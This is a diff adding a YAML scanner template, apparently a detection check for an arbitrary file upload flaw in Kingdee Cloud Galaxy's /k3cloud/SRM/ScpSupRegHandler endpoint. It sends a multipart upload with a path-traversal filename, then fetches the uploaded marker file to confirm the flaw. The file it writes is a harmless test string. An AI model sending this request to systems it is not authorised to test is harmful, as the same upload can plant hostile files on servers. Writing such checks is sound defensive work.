@@ -1,0 +1,18 @@
+name: 金蝶-Apusic-金蝶云星空管理中心-ScpSupRegHandler-文件上传
+description: >-
+  文件上传
+alwaysExecute: false
+matchCount: 2
+rules:
+  - method: POST
+    path: /k3cloud/SRM/ScpSupRegHandler
+    headers:
+      Content-Type: multipart/form-data; boundary=zsqxokga
+    body: "--zsqxokga\r\nContent-Disposition: form-data; name=\"dbId_v\"\r\n\r\n.\r\n--zsqxokga\r\nContent-Disposition: form-data; name=\"FID\"\r\n\r\n2024\r\n--zsqxokga\r\nContent-Disposition: form-data; name=\"FAtt\"; filename=\"../../../../uploadfiles/Rscan_test.txt\"\r\nContent-Type: text/plain\r\n\r\nRscan_test\r\n--zsqxokga--"
+    expression:
+      status: 200
+  - method: GET
+    path: /k3cloud/uploadfiles/Rscan_test.txt
+    expression:
+      status: 200
+      body_all: ["Rscan_test"]
